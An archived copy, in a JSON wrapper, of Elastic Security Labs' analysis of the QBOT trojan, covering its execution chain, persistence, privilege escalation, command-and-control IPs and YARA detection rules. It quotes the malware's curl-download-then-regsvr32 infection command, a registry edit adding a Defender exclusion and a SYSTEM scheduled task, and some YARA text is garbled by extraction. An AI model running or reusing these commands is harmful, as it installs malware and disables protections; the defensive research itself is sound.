{
    "id": "f171cd59-dc7f-4f2f-8785-3f1d758d4a8f",
    "created_at": "2023-01-12T15:06:20.311225Z",
    "updated_at": "2025-03-27T02:16:59.202828Z",
    "deleted_at": null,
    "sha1_hash": "da5a7bdd13fed07401289538c563703454f59d42",
    "title": "2022-07-27 - Exploring the QBOT Attack Pattern",
    "authors": "",
    "file_creation_date": "2022-08-18T03:52:44Z",
    "file_modification_date": "2022-08-18T03:52:44Z",
    "file_size": 5671575,
    "plain_text": "# Exploring the QBOT Attack Pattern\n\n**elastic.co/security-labs/exploring-the-qbot-attack-pattern**\n\n_QBOT attack pattern and malware observations_\n\nBy\n\nCyril François,\n\nSeth Goodwin,\n\nAndrew Pease\n\n27 Juli 2022\n\n## Key Takeaways\n\nQBOT is a popular, actively developed, and full-featured trojan\nAdversary-controlled or owned infrastructure has been observed being used by numerous samples\nThe analyzed sample leverages multiple persistence and defense evasion mechanisms\n\n## Preamble\n\nElastic Security Labs has been tracking REF3726, an attack pattern for the QBOT malware family. QBOT, also known as\n[QAKBOT, is a prolific modular trojan that has been active since around 2007. QBOT’s loading mechanism makes it an](https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot)\nattractive framework to threat actors and ransomware groups and has led to widespread infections of the family; targeting\nvictims across multiple verticals.\n\nThis research covers:\n\nExecution chain\n\n\n-----\n\nDefense evasion\nPersistence mechanisms\nPrivilege escalation\nNetwork events\nQBOT configuration extractor\nObserved tactics and techniques\n\nThrough this research, from static and dynamic analysis and Elastic telemetry, we uncovered 138 adversary-controlled or\nowned IP addresses. These IP addresses were linked to our sample and used to identify 339 additional associated\nmalicious files. All artifacts are provided as STIX JSON and Elastic Common Schema (ECS) documents.\n\nThe QBOT Configuration Extractor\n\nFor information on the QBOT configuration extractor, check out our blog posts detailing this:\n\n[QBOT Configuration Extractor](https://www.elastic.co/security-labs/qbot-configuration-extractor)\n\n## Analysis Environment\n\nWe selected a sample for analysis that we could statically and dynamically analyze. This process is commonly used to\nenrich both types of analysis. For the dynamic analysis, the sample was detonated on a Windows 10 Enterprise VM\nrunning the Elastic Endpoint, the Windows and Network Packet Capture Elastic Agent integrations, and an aggressive\nendpoint logging policy. All events were shipped to our Elastic Cloud cluster and processed through the Elastic Security\nApp. The Elastic Security Endpoint was configured for Alerting and Eventing only (no Prevention). Alerts were generated\nfrom Detection Rules in the Security App and directly from the Elastic Security Endpoint default ruleset.\n\n## Execution Chain\n\nThe following section will describe the observed execution chain for the Qbot malware sample. This includes events from\nInitial Execution to Defense Evasion to Persistence to Privilege Escalation.\n\nFull execution chain of the QBOT malware sample\n\n### Initial Execution\n\n\n-----\n\nThe initial execution of the QBOT sample was observed in Elastic s telemetry data (derived from @proxylife s published\nresearch on QBOT).\n```\n\"C:\\Windows\\System32\\cmd.exe\" /q /c echo 'Ft' && ping REDACTED[.]com && MD \"\\\\vyr\" && curl.exe -o\n\\\\vyr\\v4QpQt.Nqv.e8xO https://REDACTED[.]net/t8EKnIB/C.png && echo \"sxF\" && ping REDACTED[.]com && regsvr32\n\"\\\\vyr\\v4QpQt.Nqv.e8xO\"\n\n```\nNote, that the domains in the initial execution appear to be adversary-controlled, not adversary-owned; because of this,\nwe are redacting them from our reporting.\n\nThe initial execution command does the following:\n\n**C:\\Windows\\System32\\cmd.exe - this executes the Microsoft command interpreter**\n**/q - this switch of cmd.exe is to suppress echo output**\n**/c - this switch of cmd.exe is to pass a specific command string to the command interpreter**\n**echo ‘Ft’ - this prints ‘Ft’ to STDOUT**\n**&& - if the preceding commands were successful, continue and run the next series of commands**\n**ping REDACTED[.]com - this performs a network connection test to an external domain using the Ping command**\n**MD “\\\\vyr” - this creates the vyr directory in the root directory (C:\\)**\n**curl.exe - this executes the data transfer tool, cURL**\n**-o \\\\vyr\\v4QpQt.Nqv.e8xO https://REDACTED[.]net/t8EKnIB/C.png - using the cURL tool, download and save the**\n**C.png file, from REDACTED[.]net, to the vyr directory with a filename of v4QpQt.Nqv.e8xO**\n**echo \"sxF\" - this prints “sxF” to STDOUT**\n**regsvr32 \"\\\\vyr\\v4QpQt.Nqv.e8xO\" - uses the Microsoft Register Server (regsvr32) to execute v4QpQt.Nqv.e8xO**\n\nThe infection was prevented by Elastic Endpoint Security, so while the customer was protected, it stopped our ability to\nmonitor the next steps in the infection. To continue the analysis, we manually detonated the sample in our sandbox.\n\n### Manually Advancing Execution\n\nThis manual detonation picked up where Elastic Endpoint Security stopped the initial execution outlined above.\n\nTo allow the infection to continue, the sample was downloaded to our victim machine and executed manually using the\n[Microsoft Register Server (regsvr32.exe). The Register Server is a command-line utility to register and unregister DLLs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32)\n(and other objects) in the Windows Registry.\n```\nregsvr32 -s c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll\n\n```\n**regsvr32 - this executes the Microsoft Register Server**\n**-s - this suppresses messages boxes**\n\nNow that we have manually executed the Qbot DLL, we can track the execution chain, defense evasion, and persistence\ntechniques using the Elastic Security Solution.\n\nFrom within the Security Solution, we can expand the malware event generated by the Qbot DLL execution and explore\nthe details. While we manually executed the malware and know much of this information, it is still helpful as an analyst\nwhen researching live malware events.\n\n\n-----\n\nInitial alert in the Kibana Security Solution\nFrom here we can click on the “Analyze event” button to launch a timeline as a process tree that will show us how the\nmalware progressed and additional contextually relevant information.\n\nViewing the execution chain as a process tree\nNow that we’re in the Analyzer view, we can continue to step through the QBOT DLL execution chain.\n\n\n-----\n\nMicrosoft Registry Server used to execute the QBOT DLL\nThe Microsoft command interpreter was opened, and then the first regsvr32.exe process is started from\n**C:\\Windows\\System32\\. Next, a child regsvr32.exe process is spawned from C:\\Windows\\SysWOW64\\ with the same**\ncommand-line arguments. The SysWOW64 folder stores system files used to execute 32-bit processes on a 64-bit\nWindows operating system. This is expected because the Qbot DLL is a 32-bit file.\n\nOnce the DLL is executed by regsvr32.exe, it injects itself into the Explorer process.\n\nNext, an explorer.exe process is started then immediately self-injects shellcode. In addition to the shellcode injection, we\ncan see 17 file events, 32 network-based events, and 16 registry events observed. We’ll explore those further in the\nresearch.\n\n\n-----\n\nQBOT injecting into explorer.exe\nBefore proceeding, QBOT performs a check to prevent execution on systems that are using the following default system\nlanguages:\n\nLANG_RUSSIAN (Russia)\nLANG_BELARUSIAN (Belarus)\nLANG_KAZAK (Kazakhstan)\nLANG_ARMENIAN (Armenia)\nLANG_GEORGIAN (Georgia)\nLANG_UZBEK (Uzbekistan)\nLANG_TAJIK (Tajikistan)\nLANG_TURKMEN (Turkmenistan)\nLANG_UKRAINIAN (Ukraine)\nLANG_BOSNIAN (Bosnia)\nLANG_KYRGYZ (Kyrgyzstan)\n\n\n-----\n\nQBOT checking for specified default\n\nsystem languages\n\n### Defense Evasion\n\nOnce the initial execution chain was completed, we observed attempts at defense evasion to protect the malware and\nfrustrate adversary eviction.\n\nAs noted above, Elastic Endpoint Security observed 17 file events from the injected explorer.exe. One of the 17 events\noccurred when the DLL copied itself from its current path to C:\\Users\\\n\n**[REDACTED]\\AppData\\Roaming\\Microsoft\\Vybgeuye and named itself maonyo.dll. The maonyo.dll file is the same**\nfile as the original Qbot DLL that was manually executed, verified by the SHA-256 hash.\n\n\n-----\n\nCreating of the maonyo.dll file\nThis defense evasion tactic will allow the QBOT DLL to continue to be executed even if the original file is deleted.\n\nIn addition to creating the maonyo.dll file, static malware analysis identified a thread called “watchdog”. The watchdog\nthread monitors for security instrumentation tools that are stored in a list and compared to running processes.\n\nEvery second, the watchdog thread will check to see if any of the running processes matches anything on the list.\n\nThe processes that are monitored for are common security analysis tools.\n\n\n-----\n\nWatchdog monitoring for security\n\ntooling\nIf any of the monitored processes are observed by the malware, it will proceed with randomly generated IP addresses\ninstead of the hard coded ones in the resources section. If a monitored process is detected, an entry is made to the\nWindows Registry and the malware does not attempt to connect to the actual network infrastructure.\n\nOf note, the qak_proxy process identified in the monitored process list is unknown to us. It is possible that this is for an\nundisclosed security tool that monitors for QBOT network communications or when QBOT is acting as a proxy (which we\ndid not observe with our sample), but that is speculative in nature.\n\nThe static analysis showed that the malware is able to detect running antivirus by checking the list of running processes\nagainst known vendors binaries. Depending on the antivirus processes detected, the malware has different behaviors - as\nan example, if Windows Defender is detected, it add its persistence folder to the Windows Defender exclusion path.\n\n\n-----\n\nWatchdog monitoring for\n\nantivirus processes\n\nQBOT adding a Windows Defender exclusion path\nThe reg.exe command does the following:\n\n**C:\\Windows\\system32\\reg.exe - Microsoft Registry editor**\n**ADD HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths - folder location in the registry for**\nWindows Defender exclusions\n**/f - adds the registry entry without prompting for confirmation**\n**/t REG_DWORD - specifies the type for the registry entry**\n**/v C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Vybgeuye - specifies the name of the registry entry**\n**/d 0 - specifies the data for the new registry entry**\n\n### Persistence\n\nAfter the maonyo.dll file is created at the random location, C:\\Users\\\n\n**[REDACTED]\\AppData\\Roaming\\Microsoft\\Vybgeuye\\ (see the Defense Evasion section) in our example, the**\n**HKEY_USERS\\S-1-5-21-1047687853-4161697681-4019128061-**\n**1002\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\lnkotdhh and**\n**HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Maonyoeve Windows Registry paths are created to execute the**\n**maoyno.dll file every time the user with the SID S-1-5-21-1047687853-4161697681-4019128061-1002 logs onto the**\ninfected host. This SID is for the user that we used when detonating the DLL.\n\nQBOT jumping users\n\nWhile we did not observe QBOT spreading to other users' SIDs in the Windows Registry during dynamic analysis, static\nanalysis shows that this capability exists.\n\nWe were able to identify the registry path creations using Kibana (see below and in the Defense Evasion section), the\n[security researchers over at Trustwave’s Spider Labs published some great research about how to find the location of the](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/decrypting-qakbots-encrypted-registry-keys/)\ncreated QBOT DLL by decrypting binary data stored at HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\[random\n**folder].**\n\n\n-----\n\nLogon script added to the Windows Registry\nUsing the [decryption tool that Spider Labs released as part of their research, we were able to manually validate what we](https://github.com/drole/qakbot-registry-decrypt)\nwere seeing in Kibana.\n\n\n-----\n\nDecrypting binary data added to the Windows Registry\n\n### Privilege Escalation\n\nThe privilege escalation mechanism we observed was when the injected explorer.exe process spawns schtasks.exe and\ncreates a new scheduled task to run as the SYSTEM user.\n\n\n-----\n\nScheduled task creation\n```\nC:\\Windows\\system32\\schtasks.exe, /Create, /RU, NT AUTHORITY\\SYSTEM, /tn, ayttpnzc, /tr, regsvr32.exe -s\n\"c:\\Users\\[REDACTED]\\Desktop\\7611346142\\c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll\",\n/SC, ONCE, /Z, /ST, 15:21, /ET, 15:33\n\n```\nThe initial schtasks.exe command does the following:\n\n\n-----\n\n**/Create creates a scheduled task**\n**/RU** **NT AUTHORITY\\SYSTEM - sets the username and escalates privilege as the SYSTEM user**\n**/tn ayttpnzc - defines the task name**\n**/tr** **regsvr32.exe -s \"c:\\Users\\**\n\n**[REDACTED]\\Desktop\\7611346142\\c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll**\n\n   - specifies the task to run\n**/sc ONCE - specifies the schedule frequency - once**\n**/Z - option that marks the task to be deleted after its execution**\n**/ST 15:21 - specifies the task start time (scheduled to start approximately 2-minutes after the scheduled task was**\ncreated)\n**/ET 15:33 - time to end the task if not completed**\n\n## Network Events\n\nAs we highlighted in the Preamble, there were 32 observed network events generated by the QBOT DLL. In addition to\nthe 32 events that we observed from the execution, we also identified 106 additional hard-coded IP addresses through\nstatic analysis. This provided us with a total of 138 IP addresses from our Qbot sample.\n\nComparing the IP addresses against a corpus of malicious files, we identified 338 additional samples communicating with\nthe same network infrastructure.\n\nNetwork infrastructure observed in multiple samples\n\n\n-----\n\nWhen looking at the distribution of network and malware data points, not all of the samples are related to QBOT. Most of\n[the Win32DLL files are QBOT related, most of the Win32EXE files are associated with the EMOTET malware family, and](https://malpedia.caad.fkie.fraunhofer.de/details/win.emotet)\nthe Microsoft Office samples are related to generic malspam attachments.\n\nSamples by file type\nFurthermore, looking at the samples over time, we can see a change in how the network infrastructure was being used.\nOn November 4, 2020, we see a change from predominantly EMOTET and generic samples to the first QBOT sample in\nour dataset on November 28, 2020. From there, Win32DLL files make up 97.1% of samples first observed after November\n2020.\n\n\n-----\n\nCollected samples over time\n\n### Analyzing Network Events\n\nWhen looking at the large number of IP addresses collected from both static and dynamic analysis, we wanted to put\nthem into a data analysis platform so that we could visualize them geographically and identify the network owners.\n\nTo do this, we used the ipinfo.io CLI tool. You can [get an API key and download the tool for free.](https://ipinfo.io/signup)\n\nTo start, we collected our list of 138 IP addresses and then sent them through the ipinfo CLI tool as a bulk job, and output\nresults as JSON into a file called qbot.json.\n\n\n-----\n\n```\n  p q j\n** manual input mode **\n\nEnter all IPs, one per line:\n\n140.82.49.12\n\n144.202.2.175\n\n144.202.3.39\n\n149.28.238.199\n\n45.63.1.12\n\n45.76.167.26\n\n…truncated…\n\n{\n\n \"140.82.49.12\": {\n\n  \"ip\": \"140.82.49.12\",\n\n  \"hostname\": \"140.82.49.12.vultrusercontent.com\",\n\n  \"city\": \"San Jose\",\n\n  \"region\": \"California\",\n\n  \"country\": \"US\",\n\n  \"country_name\": \"United States\",\n\n  \"loc\": \"37.3394,-121.8950\",\n\n  \"org\": \"AS20473 The Constant Company, LLC\",\n\n  \"postal\": \"95103\",\n\n  \"timezone\": \"America/Los_Angeles\"\n\n },\n\n \"144.202.2.175\": {\n\n  \"ip\": \"144.202.2.175\",\n\n  \"hostname\": \"144.202.2.175.vultrusercontent.com\",\n\n  \"city\": \"New York City\",\n\n  \"region\": \"New York\",\n\n  \"country\": \"US\",\n\n  \"country_name\": \"United States\",\n\n  \"loc\": \"40.7143,-74.0060\",\n\n  \"org\": \"AS20473 The Constant Company, LLC\",\n\n  \"postal\": \"10004\",\n\n  \"timezone\": \"America/New_York\"\n\n },\n\n…truncated…Read more\n\n```\nNext, we need to change this into to a newline-delimited JSON (NDJSON) file so that we can quickly upload it into\n[Elasticsearch for analysis. To do this, we can use the tool Jquery, a command-line JSON processor.](https://stedolan.github.io/jq/)\n```\n$ cat qbot.json | jq -c '.[]' > qbot.ndjson\n\n{\"ip\":\"140.82.49.12\",\"hostname\":\"140.82.49.12.vultrusercontent.com\",\"city\":\"San\nJose\",\"region\":\"California\",\"country\":\"US\",\"country_name\":\"United\nStates\",\"loc\":\"37.3394,-121.8950\",\"org\":\"AS20473 The Constant Company,\nLLC\",\"postal\":\"95103\",\"timezone\":\"America/Los_Angeles\"}\n\n{\"ip\":\"144.202.2.175\",\"hostname\":\"144.202.2.175.vultrusercontent.com\",\"city\":\"New York City\",\"region\":\"New\nYork\",\"country\":\"US\",\"country_name\":\"United States\",\"loc\":\"40.7143,-74.0060\",\"org\":\"AS20473 The Constant\nCompany, LLC\",\"postal\":\"10004\",\"timezone\":\"America/New_York\"}\n\n…truncated…\n\n```\nNow that we have an NDJSON file, we can upload that into Elasticsearch through Kibana (or with Filebeat or the Elastic\n[Agent). To do this, we’ll use the Elastic Container Project to spin up an entire Elastic Stack in Docker to do our analysis.](https://github.com/peasead/elastic-container)\n\nOnce the containers have spun up, navigate to the Data Visualizer from within the Machine Learning menu. Select the\nNDJSON file that you created previously, and click the blue Import button.\n\nProvide an index name and then click on the Advanced tab. Under the Mappings settings, change loc to geo_point and\nthen click the blue Import button.\n\n\n-----\n\nSet \"loc\" to \"geo_point\"\nNow that we have the data loaded into Elasticsearch, you can do additional analysis, such as creating a map\nvisualization.\n\nWhen looking at the distribution of network entities, we see them spread across the globe with most of them belonging to\na variety of Internet service providers.\n\n\n-----\n\nMap of all identified network infrastructure\nA caveat to the ISP-owned addresses, we did observe 7 IP addresses owned by Vultr. Vultr is a legitimate cloud hosting\nprovider and is also a favorite among adversaries because of the ability to upload custom ISO files that allow for a\nprotected command & control server.\n\nNetwork infrastructure node\n\ninformation\n\n## QBOT Configuration Extractor\n\nCollecting elements of malware events is a valuable analysis skill that can assist in the identification of additional\ncompromised hosts in a contested environment.\n\n\n-----\n\nElastic Security Labs has released an open source tool, under the Apache 2.0 license, that will allow for configurations to\n[be extracted from QBOT samples. The tool can be downloaded here.](https://www.elastic.co/security-labs/qbot-configuration-extractor)\n```\n$ qbot-config-extractor -f c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a\n\n=== Strings ===\n\n# Blob address: 0x100840a0\n\n# Key address: 0x10084040\n\n[0x0]: ProgramData\n\n[0xc]: /t4\n\n[0x10]: EBBA\n\n[0x15]: netstat -nao\n\n[0x22]: jHxastDcds)oMc=jvh7wdUhxcsdt2\n\n[0x40]: schtasks.exe /Create /RU \"NT AUTHORITY\\SYSTEM\" /SC ONSTART /TN %u /TR \"%s\" /NP /F\n\n...truncated...\n\n=== RESOURCE 1 ===\n\nKey: b'\\\\System32\\\\WindowsPowerShel1\\\\v1.0\\\\powershel1.exe'\n\nType: DataType.DOMAINS\n\n41.228.22.180:443\n\n47.23.89.62:995\n\n176.67.56.94:443\n\n103.107.113.120:443\n\n148.64.96.100:443\n\n47.180.172.159:443\n\n181.118.183.98:443\n\n...truncated...Read more\n\n```\nWe have asked Vultr to review our QBOT research and take appropriate actions in accordance with their customer Use\nPolicy, but have not received a response as of publication.\n\n## Observed Adversary Tactics and Techniques\n\n### Tactics\n\nUsing the MITRE ATT&CK® framework, tactics represent the why of a technique or sub-technique. It is the adversary’s\ntactical goal: the reason for performing an action.\n\n## Detections\n\nThe following detection rules and behavior prevention events were observed throughout the analysis of the QBOT\nsample.\n\n[Suspicious Execution via Scheduled Task](https://www.elastic.co/guide/en/security/current/suspicious-execution-via-scheduled-task.html)\n[Startup or Run Key Registry Modification](https://www.elastic.co/guide/en/security/current/startup-or-run-key-registry-modification.html)\nMemory Threat Detection Alert: Shellcode Injection\nMalicious Behavior Detection Alert: Suspicious String Value Written to Registry Run Key\nMalicious Behavior Detection Alert: Suspicious Scheduled Task Creation\n\n### YARA\n\nElastic Security has created YARA rules to identify this activity.\n\n\n-----\n\n```\n          j Q {\n  meta:\n\n    author = \"Elastic Security\"\n\n    creation_date = \"2021-02-16\"\n\n    last_modified = \"2021-08-23\"\n\n    os = \"Windows\"\n\n    arch = \"x86\"\n\n    category_type = \"Trojan\"\n\n    family = \"Qbot\"\n\n    threat_name = \"Windows.Trojan.Qbot\"\n\n    reference_sample = \"636e2904276fe33e10cce5a562ded451665b82b24c852cbdb9882f7a54443e02\"\n\n  strings:\n\n    $a1 = { 33 C0 59 85 F6 74 2D 83 66 0C 00 40 89 06 6A 20 89 46 04 C7 46 08 08 00 }\n\n    $a2 = { FE 8A 14 06 88 50 FF 8A 54 BC 11 88 10 8A 54 BC 10 88 50 01 47 83 }\n\n  condition:\n\n    any of them\n\n}\n\nrule Windows_Trojan_Qbot_2 {\n\n  meta:\n\n    author = \"Elastic Security\"\n\n    creation_date = \"2021-10-04\"\n\n    last_modified = \"2022-01-13\"\n\n    os = \"Windows\"\n\n    arch = \"x86\"\n\n    category_type = \"Trojan\"\n\n    family = \"Qbot\"\n\n    threat_name = \"Windows.Trojan.Qbot\"\n\n    reference_sample = \"a2bacde7210d88675564106406d9c2f3b738e2b1993737cb8bf621b78a9ebf56\"\n\n  strings:\n\n    $a1 = \"%u.%u.%u.%u.%u.%u.%04x\" ascii fullword\n\n    $a2 = \"stager_1.dll\" ascii fullword\n\n  condition:\n\n    all of them\n\n}\n\nrule Windows_Trojan_Qbot_3 {\n\n  meta:\n\n    author = \"Elastic Security\"\n\n    creation_date = \"2022-03-07\"\n\n    last_modified = \"2022-04-12\"\n\n    os = \"Windows\"\n\n    arch = \"x86\"\n\n    category_type = \"Trojan\"\n\n    family = \"Qbot\"\n\n    threat_name = \"Windows.Trojan.Qbot\"\n\n    reference_sample = \"0838cd11d6f504203ea98f78cac8f066eb2096a2af16d27fb9903484e7e6a689\"\n\n  strings:\n\n    $a1 = { 75 C9 8B 45 1C 89 45 A4 8B 45 18 89 45 A8 8B 45 14 89 45 AC 8B }\n    $a2 = \"\\\\stager_1.obf\\\\Benign\\\\mfc\\\\\" wide\n\n  condition:\n\n    any of them\n\n}\n\nrule Windows_Trojan_Qbot_4 {\n\n  meta:\n\n    author = \"Elastic Security\"\n\n    creation_date = \"2022-06-07\"\n\n    last_modified = \"2022-07-18\"\n\n    os = \"Windows\"\n\n    arch = \"x86\"\n\n    category_type = \"Trojan\"\n\n    family = \"Qbot\"\n\n    threat_name = \"Windows.Trojan.Qbot\"\n\n      f pl \" 2b 065654f13612 63b 7f972 91 6f 97291 3 28 180fb1912b3 \"\n\n```\n\n-----\n\n```\n  strings:\n\n    $a1 = \"qbot\" wide\n\n    $a2 = \"stager_1.obf\\\\Benign\\\\mfc\" wide\n\n    $a3 = \"common.obf\\\\Benign\\\\mfc\" wide\n\n    $a4 = \"%u;%u;%u;\"\n\n    $a5 = \"%u.%u.%u.%u.%u.%u.%04x\"\n\n    $a6 = \"%u&%s&%u\"\n\n    $get_string1 = { 33 D2 8B ?? 6A 5A 5? F7 ?? 8B ?? 08 8A 04 ?? 8B 55 ?? 8B ?? 10 3A 04 ?? }\n\n    $get_string2 = { 33 D2 8B ?? F7 75 F4 8B 45 08 8A 04 02 32 04 ?? 88 04 ?? ?? 83 ?? 01 }\n\n    $set_key = { 8D 87 00 04 00 00 50 56 E8 ?? ?? ?? ?? 59 8B D0 8B CE E8 }\n\n    $do_computer_use_russian_like_keyboard = { B9 FF 03 00 00 66 23 C1 33 C9 0F B7 F8 66 3B 7C 4D }\n\n    $execute_each_tasks = { 8B 44 0E ?? 85 C0 74 ?? FF D0 EB ?? 6A 00 6A 00 6A 00 FF 74 0E ?? E8 ?? ?? ?? ??\n83 C4 10 }\n\n    $generate_random_alpha_num_string = { 57 E8 ?? ?? ?? ?? 48 50 8D 85 ?? ?? ?? ?? 6A 00 50 E8 ?? ?? ?? ??\n8B 4D ?? 83 C4 10 8A 04 38 88 04 0E 46 83 FE 0C }\n\n    $load_base64_dll_from_file_and_inject_into_targets = { 10 C7 45 F0 50 00 00 00 83 65 E8 00 83 7D F0 0B\n73 08 8B 45 F0 89 }\n\n  condition:\n\n    6 of them\n\n}Read more\n\n## Artifacts\n\n```\n[Artifacts are also available for download in both ECS and STIX format in a combined zip bundle.](https://assets.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt84567d45657fe98d/62e16c9dd2f5267009ac072e/qbot-indicators.zip)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-27 - Exploring the QBOT Attack Pattern.pdf"
    ],
    "report_names": [
        "2022-07-27 - Exploring the QBOT Attack Pattern.pdf"
    ],
    "threat_actors": [
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535980,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1660794764,
    "ts_modification_date": 1660794764,
    "files": {
        "pdf": "https://archive.orkl.eu/da5a7bdd13fed07401289538c563703454f59d42.pdf",
        "text": "https://archive.orkl.eu/da5a7bdd13fed07401289538c563703454f59d42.txt",
        "img": "https://archive.orkl.eu/da5a7bdd13fed07401289538c563703454f59d42.jpg"
    }
}